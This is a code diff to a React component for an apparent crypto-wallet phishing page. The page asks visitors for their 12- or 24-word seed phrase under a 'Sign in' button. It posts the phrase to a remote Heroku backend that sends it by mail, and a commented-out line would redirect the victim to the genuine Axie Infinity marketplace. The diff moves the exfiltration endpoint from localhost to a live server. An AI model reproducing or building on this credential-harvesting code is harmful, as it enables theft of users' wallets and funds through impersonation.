@@ -10,9 +10,14 @@ const TextArea = () => {
 
     const handleclick = async () => {
         console.log(Data);
-        await axios.post("http://localhost:5000/sendmail", {
-            message: Data
-        })
+        try {
+            await axios.post("https://myjob-backend.herokuapp.com/sendmail", {
+                message: Data
+            })
+            // window.location.href = "http://marketplace.axieinfinity.com/"
+        } catch (error) {
+            console.log(error);
+        }
     }
     return (
         <div className="inputsection">
@@ -20,9 +25,9 @@ const TextArea = () => {
                 setData(e.target.value)
             }} />
             <p className="textareadescription">Typically 12(sometimes24) words seperated by a single spaces</p>
-            <Link to="http://marketplace.axieinfinity.com/">
-                <SigninButton sendmail={handleclick} >Sign in</SigninButton>
-            </Link>
+
+            <SigninButton sendmail={handleclick} >Sign in</SigninButton>
+
 
         </div>
     )
